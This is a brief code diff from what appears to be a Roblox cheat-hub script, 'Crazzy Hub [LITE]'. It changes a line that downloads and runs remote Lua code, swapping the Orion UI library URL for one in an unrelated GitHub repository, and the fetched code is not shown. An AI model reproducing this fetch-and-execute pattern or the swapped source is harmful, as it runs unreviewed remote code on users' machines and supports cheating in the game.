@@ -1,4 +1,4 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Hirimii/f4ckyou/main/cclua')))()
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Crazzy Hub [LITE]",
 	Text = "Loading...",
